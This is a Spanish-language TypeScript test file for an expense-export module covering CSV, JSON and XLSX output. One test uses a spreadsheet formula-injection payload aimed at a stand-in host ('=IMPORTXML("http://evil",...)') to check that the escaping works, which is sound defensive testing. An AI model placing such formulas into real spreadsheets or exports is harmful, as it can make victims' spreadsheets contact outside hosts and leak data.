import test from 'node:test';
import assert from 'node:assert/strict';
import { Prisma } from '@prisma/client';
import { buildCsv, buildJson, buildXlsx, MIME_TYPES, type ExportRow } from '../src/lib/export';

/**
 * Exportación.
 *
 * El CSV se abre en Excel, por lo que el BOM, el punto y coma y la defensa
 * frente a fórmulas no son detalles estéticos: son lo que separa un fichero
 * útil de uno con la columna desplazada o con una fórmula ejecutándose.
 */

const OPTIONS = { timezone: 'Europe/Madrid', locale: 'es-ES', currency: 'EUR' };

function row(overrides: Partial<ExportRow> = {}): ExportRow {
  return {
    id: '6b6f4b7e-1e77-4a5c-9f6c-5d9f4a5c8f7e',
    amount: new Prisma.Decimal('12.50'),
    currency: 'EUR',
    merchant: 'Mercadona',
    categoryName: 'Supermercado',
    description: 'Compra semanal',
    source: 'revolut',
    paymentMethod: null,
    expenseDate: new Date('2026-09-28T10:15:00.000Z'),
    sourceTimezone: 'Europe/Madrid',
    receivedAt: new Date('2026-09-28T10:15:05.000Z'),
    edited: false,
    createdAt: new Date('2026-09-28T10:15:05.000Z'),
    ...overrides,
  };
}

test('el CSV lleva BOM, separador punto y coma y cabecera en español', () => {
  const csv = buildCsv([row()], OPTIONS).toString('utf8');
  assert.equal(csv.charCodeAt(0), 0xfeff, 'falta el BOM UTF-8');
  // El BOM forma parte de la primera línea: se quita antes de mirar la cabecera.
  const [header] = csv.slice(1).split('\r\n');
  assert.equal(header, 'ID;Fecha;Hora;Importe;Moneda;Comercio;Categoría;Descripción;Origen;Método de pago;Editado;Zona horaria;Recibido;Registrado');
  assert.match(csv, /Web \(manual\)|Notificación \(Revolut\)|Atajo de iPhone/);
});

test('el importe sale con dos decimales y el método de pago desconocido queda vacío', () => {
  const csv = buildCsv([row({ amount: new Prisma.Decimal('4'), paymentMethod: null })], OPTIONS).toString('utf8');
  const [, line] = csv.split('\r\n');
  const cells = line.split(';');
  // Columna 4 (índice 3): Importe.
  assert.equal(cells[3], '4.00');
  // Columna 10 (índice 9): método de pago → vacío, nunca "Tarjeta".
  assert.equal(cells[9], '');
});

test('los comercios con fórmulas se neutralizan', () => {
  const csv = buildCsv([row({ merchant: '=IMPORTXML("http://evil","x")' })], OPTIONS).toString('utf8');
  assert.ok(csv.includes("'=IMPORTXML"), 'no se prefijó el apóstrofo de escape');
  assert.ok(!/[;,]=IMPORTXML/.test(csv), 'la fórmula quedó sin escapar en una celda');
});

test('un valor con punto y coma se entrecomilla', () => {
  const csv = buildCsv([row({ description: 'Vino; pan y queso' })], OPTIONS).toString('utf8');
  assert.ok(csv.includes('"Vino; pan y queso"'), 'no se entrecomilló el valor con ;');
});

test('un método de pago nulo no se convierte en etiqueta', () => {
  const csv = buildCsv([row({ paymentMethod: 'card' })], OPTIONS).toString('utf8');
  assert.ok(csv.includes('Tarjeta'), 'falta la etiqueta de método de pago');
  const csvNull = buildCsv([row({ paymentMethod: null })], OPTIONS).toString('utf8');
  assert.ok(!csvNull.includes('Tarjeta'), 'un pago desconocido se etiquetó como Tarjeta');
});

test('la exportación JSON conserva los campos crudos y redondea el importe', () => {
  const payload = JSON.parse(buildJson([row({ amount: new Prisma.Decimal('12.50') })], OPTIONS).toString('utf8'));
  assert.equal(payload.version, 1);
  assert.equal(payload.count, 1);
  assert.equal(payload.timezone, 'Europe/Madrid');
  const [expense] = payload.expenses;
  assert.equal(expense.amount, 12.5);
  assert.equal(expense.paymentMethod, null);
  assert.equal(expense.source, 'revolut');
  assert.equal(expense.expenseDate, '2026-09-28T10:15:00.000Z');
  assert.equal(expense.edited, false);
});

test('los tres formatos declaran su MIME correcto', () => {
  assert.equal(MIME_TYPES.csv, 'text/csv; charset=utf-8');
  assert.equal(MIME_TYPES.json, 'application/json; charset=utf-8');
  assert.match(MIME_TYPES.xlsx, /spreadsheet/);
});

test('el Excel se genera de verdad, no es un CSV renombrado', async () => {
  const buffer = await buildXlsx([row()], OPTIONS);
  // Un .xlsx es un zip OOXML: empieza por la firma PK.
  assert.equal(buffer.subarray(0, 2).toString('latin1'), 'PK');
  assert.ok(buffer.length > 500, 'el libro quedó sospechosamente vacío');
});
